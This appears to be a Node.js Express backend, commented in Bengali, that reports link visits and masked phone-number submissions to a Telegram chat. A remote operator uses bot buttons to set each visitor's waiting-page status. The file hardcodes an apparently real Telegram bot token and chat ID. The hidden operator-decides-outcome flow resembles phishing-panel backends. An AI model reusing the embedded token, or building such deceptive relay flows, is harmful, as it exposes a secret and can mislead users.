const express = require("express");
const path = require("path");

const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname)));


// =====================================
// Telegram Configuration
// =====================================

// এখানে আপনার নতুন Telegram Bot Token বসাবেন
const BOT_TOKEN = "8774013288:AAHSp3huLQxcdJDKWFCywP3o_xgl5Vjrj48";

// এখানে আপনার Telegram Chat ID বসাবেন
const CHAT_ID = "8398202645";


// =====================================
// Session Storage
// =====================================

const sessions = new Map();

const clients = new Map();


// =====================================
// Phone Mask
// =====================================

function maskPhone(phone) {

  const clean =
    String(phone)
      .replace(/\s+/g, "");

  if (clean.length <= 4) {
    return "****";
  }

  return (
    "*".repeat(
      Math.max(0, clean.length - 4)
    ) +
    clean.slice(-4)
  );
}


// =====================================
// Telegram API
// =====================================

async function telegram(method, body) {

  const response = await fetch(
    `https://api.telegram.org/bot${BOT_TOKEN}/${method}`,
    {
      method: "POST",

      headers: {
        "Content-Type": "application/json"
      },

      body: JSON.stringify(body)
    }
  );

  return response.json();
}


// =====================================
// Send Telegram Message
// =====================================

async function sendTelegramMessage(
  text,
  sessionId,
  includeButtons = false
) {

  const body = {

    chat_id: CHAT_ID,

    text: text

  };


  if (includeButtons) {

    body.reply_markup = {

      inline_keyboard: [

        [
          {
            text: "⏳ Force Waiting",
            callback_data:
              `wait:${sessionId}`
          }
        ],

        [
          {
            text: "✅ Success",
            callback_data:
              `success:${sessionId}`
          },

          {
            text: "❌ Error",
            callback_data:
              `error:${sessionId}`
          }
        ]

      ]

    };

  }


  return telegram(
    "sendMessage",
    body
  );
}


// =====================================
// Home
// =====================================

app.get("/", (req, res) => {

  res.sendFile(
    path.join(
      __dirname,
      "index.html"
    )
  );

});


// =====================================
// Link Visit
// =====================================

app.post(
  "/api/visit",
  async (req, res) => {

    const {
      sessionId
    } = req.body;


    if (!sessionId) {

      return res
        .status(400)
        .json({
          success: false
        });

    }


    sessions.set(
      sessionId,
      {
        status: "waiting",
        createdAt: Date.now()
      }
    );


    await sendTelegramMessage(

      `🔗 নতুন Link Visit\n\n` +

      `Session: ${sessionId}\n` +

      `Status: User opened the link`,

      sessionId,
      false

    );


    res.json({
      success: true
    });

  }
);


// =====================================
// Phone Check
// =====================================

app.post(
  "/api/check",
  async (req, res) => {

    const {
      sessionId,
      phone
    } = req.body;


    if (!sessionId || !phone) {

      return res
        .status(400)
        .json({

          success: false,

          message:
            "প্রয়োজনীয় তথ্য পাওয়া যায়নি।"

        });

    }


    const masked =
      maskPhone(phone);


    sessions.set(
      sessionId,
      {

        status: "waiting",

        phone: masked,

        createdAt: Date.now()

      }
    );


    await sendTelegramMessage(

      `📱 নতুন Check Request\n\n` +

      `📞 Phone: ${masked}\n` +

      `🆔 Session: ${sessionId}\n\n` +

      `⏳ User is now on Waiting Page.`,

      sessionId,

      true

    );


    res.json({
      success: true
    });

  }
);


// =====================================
// Server-Sent Events
// =====================================

app.get(
  "/api/events/:sessionId",
  (req, res) => {

    const sessionId =
      req.params.sessionId;


    res.setHeader(
      "Content-Type",
      "text/event-stream"
    );

    res.setHeader(
      "Cache-Control",
      "no-cache"
    );

    res.setHeader(
      "Connection",
      "keep-alive"
    );


    res.flushHeaders();


    if (!clients.has(sessionId)) {

      clients.set(
        sessionId,
        new Set()
      );

    }


    clients
      .get(sessionId)
      .add(res);


    const session =
      sessions.get(sessionId);


    if (session) {

      res.write(
        `data: ${JSON.stringify({
          status: session.status
        })}\n\n`
      );

    }


    req.on(
      "close",
      () => {

        const set =
          clients.get(sessionId);

        if (set) {

          set.delete(res);

        }

      }
    );

  }
);


// =====================================
// Send Status To Browser
// =====================================

function updateStatus(
  sessionId,
  status
) {

  const session =
    sessions.get(sessionId);


  if (!session) {
    return;
  }


  session.status =
    status;


  sessions.set(
    sessionId,
    session
  );


  const set =
    clients.get(sessionId);


  if (!set) {
    return;
  }


  const message =
    `data: ${JSON.stringify({
      status: status
    })}\n\n`;


  for (const client of set) {

    client.write(message);

  }


  if (
    status === "success" ||
    status === "error"
  ) {

    for (const client of set) {

      client.end();

    }

    clients.delete(sessionId);

  }

}


// =====================================
// Telegram Callback Polling
// =====================================

let updateOffset = 0;


async function pollTelegram() {

  try {

    const result =
      await telegram(
        "getUpdates",
        {

          offset:
            updateOffset,

          timeout: 25,

          allowed_updates:
            ["callback_query"]

        }
      );


    if (
      result.ok &&
      Array.isArray(result.result)
    ) {

      for (
        const update
        of result.result
      ) {

        updateOffset =
          update.update_id + 1;


        const callback =
          update.callback_query;


        if (!callback) {
          continue;
        }


        const data =
          callback.data || "";


        const parts =
          data.split(":");


        const command =
          parts[0];

        const sessionId =
          parts.slice(1).join(":");


        if (!sessionId) {
          continue;
        }


        if (
          command === "wait"
        ) {

          updateStatus(
            sessionId,
            "waiting"
          );

        }


        if (
          command === "success"
        ) {

          updateStatus(
            sessionId,
            "success"
          );

        }


        if (
          command === "error"
        ) {

          updateStatus(
            sessionId,
            "error"
          );

        }


        await telegram(
          "answerCallbackQuery",
          {
            callback_query_id:
              callback.id,

            text:
              "Status updated"
          }
        );

      }

    }

  } catch (error) {

    console.error(
      "Telegram polling error:",
      error.message
    );

  }


  setTimeout(
    pollTelegram,
    1000
  );

}


pollTelegram();


// =====================================
// Start Server
// =====================================

const PORT =
  process.env.PORT || 3000;


app.listen(
  PORT,
  () => {

    console.log(
      `Server running on port ${PORT}`
    );

  }
);
